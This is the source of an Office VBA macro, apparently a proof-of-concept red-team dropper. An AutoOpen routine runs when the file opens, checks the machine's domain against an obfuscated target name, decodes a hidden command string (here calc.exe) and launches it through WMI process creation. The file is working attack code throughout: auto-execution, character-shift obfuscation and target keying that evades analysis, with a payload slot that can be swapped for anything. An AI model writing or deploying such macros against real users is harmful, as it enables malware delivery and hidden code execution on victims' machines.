Sub AutoOpen()
'
' AutoOpen Macro
'
'
Dim payload As String
Dim processID As Integer
Dim outputID As Integer
Dim computer As String

If (Environ("USERDOMAIN") = decode("FGUMVQR/O:KXS2P")) Then
MsgBox "We passed the domain check"

payload = "ecne0gzg"
payload = decode(payload)
computer = "."

Set wmi = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" _
    & computer & "\root\cimv2")
                    
Set startupinfo = wmi.Get("Win32_ProcessStartup")
Set startupconfig = startupinfo.SpawnInstance_
startupconfig.ShowWindow = 1

Set win32process = wmi.Get("Win32_Process")

outputID = win32process.Create(payload, Null, startupconfig, processID)

End If

End Sub

Function decode(data As String) As String
Dim loopcount As Long
Dim output As String

For loopcount = 1 To Len(data)
    output = output & Chr(Asc(Mid(data, loopcount, 1)) - 2)
Next loopcount

    decode = output
End Function

